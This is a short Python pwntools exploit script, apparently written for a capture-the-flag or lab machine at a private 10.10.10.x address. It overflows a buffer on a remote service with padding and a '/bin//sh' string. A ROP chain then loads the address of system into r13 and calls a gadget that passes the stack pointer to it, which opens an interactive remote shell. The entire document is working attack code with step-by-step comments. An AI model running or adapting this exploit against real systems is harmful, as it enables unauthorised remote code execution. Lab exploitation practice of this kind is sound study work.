#!/usr/bin/python

from pwn import *

# Connection
host = '10.10.10.147'
port = 1337

# ROP gadgets 
system_plt = 0x00401040 # Found with gdb - "disas main" shows PLT entry for system
pop_rdi    = 0x000000000040120b # Found with ROPgadget 
mov_rdirsp = 0x0000000000401156 # Found with ROPgadget
pop_131415 = 0x0000000000401206 # Found with ROPgadget
test       = 0x0000000000401152 # Found with ROPgadget

def exploit(conn):
    payload = "A"*112 # Buffer size is 120, but
    payload += "/bin//sh" # We need the last 8 bytes to be our parameter to the system call
    payload += p64(pop_131415) # Pop r13, pop r14, pop r15
    payload += p64(system_plt) # Load r13 with address of system, since that's where we want to jump to
    payload += p64(0xdeadbeef) # Load r14 with dummy data, we don't need it
    payload += p64(0xdeadbeef) # Load r15 with dummy data, we don't need it
    payload += p64(test) # Call the test function, which loads rsp into rdi and jumps to r13. RSP holds the last 8 bytes of our buffer
    conn.recvline() # Receive the first line of output, just system("/usr/bin/uptime")
    conn.sendline(payload) # Send our payload
    conn.interactive() # Owned

if __name__=="__main__":
    conn = remote(host, port)
    exploit(conn)
